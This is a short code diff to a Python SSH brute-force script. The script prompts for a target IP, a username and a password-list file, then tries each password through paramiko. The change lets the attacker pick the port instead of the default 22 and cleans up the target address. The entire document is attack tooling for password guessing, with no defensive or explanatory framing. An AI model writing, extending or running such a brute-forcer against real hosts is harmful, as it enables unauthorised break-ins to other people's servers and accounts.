@@ -3,6 +3,7 @@ import sys
 import os 
 
 target_ip = str(input('Please Enter the target IP: '))
+port = int(input('Enter the port :'))
 username = str(input('Please enter username to bruteforce: '))
 password_file = str(input('Please enter the location of the password file : '))
 
@@ -14,7 +15,7 @@ def ssh_connect(password,code=0):
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 	try:
-		ssh.connect(target_ip,port=22,username=username,password=password)
+		ssh.connect(target_ip.strip(),port=port,username=username,password=password)
 	except paramiko.AuthenticationException:
 		code = 1
 	ssh.close()
